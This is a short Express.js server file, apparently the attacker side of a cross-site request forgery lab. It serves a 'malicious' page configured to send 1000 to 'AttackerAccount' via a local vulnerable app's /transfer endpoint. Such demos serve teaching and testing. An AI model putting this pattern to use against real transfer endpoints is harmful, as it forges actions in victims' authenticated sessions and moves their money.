const express = require('express')
const path = require('path')

const app = express()
const port = 4000;


// set pug as view engine
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');


app.get('/', (req, res) => {
  res.render('malicious', {
    vulnerableAppUrl: 'http://localhost:3000/transfer',
    recipient: 'AttackerAccount',
    amount: '1000'
  })
})

app.listen(port, ()=> {
  console.log("Evil app is running at port 4000");
  console.log("There is a surprise waiting open localhost:4000 to see")
})